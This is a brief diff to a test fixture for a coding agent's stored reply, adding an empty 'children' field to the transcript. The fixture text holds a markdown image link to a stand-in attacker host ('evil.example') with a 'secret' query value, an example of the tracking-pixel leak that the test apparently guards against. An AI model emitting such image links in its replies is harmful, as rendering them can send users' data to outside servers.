@@ -76,6 +76,7 @@ describe("a coding agent's stored reply", () => {
             agentKey: "claude",
             reason: "finished",
             transcript: {
+                children: [],
                 media: [],
                 reasoning: "",
                 text: "Chart ![c](out/chart.png) and a pixel ![](https://evil.example/?q=secret).",
